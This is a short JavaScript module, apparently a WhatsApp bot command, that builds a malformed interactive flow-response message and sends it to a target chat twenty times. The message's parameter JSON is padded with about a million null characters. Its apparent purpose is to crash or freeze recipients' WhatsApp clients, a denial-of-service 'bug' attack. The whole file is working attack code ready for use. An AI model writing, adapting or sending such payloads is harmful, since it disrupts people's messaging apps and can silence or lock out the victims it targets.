
// Function to send beta1 message
async function bug(message, client){

    const target = message.key.remoteJid;

    await client.relayMessage(target, 

            {
                viewOnceMessage: {

                    message: {

                        interactiveResponseMessage: {

                            body: {

                                text: "Hello world",

                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {

                                name: 'galaxy_message'
                                ,
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
    }


async function gcbug(message, client){

    for (let i = 0; i < 20; i++) {

            await bug(message, client);

            await new Promise(resolve => setTimeout(resolve, 2000));

        }
}


export default gcbug;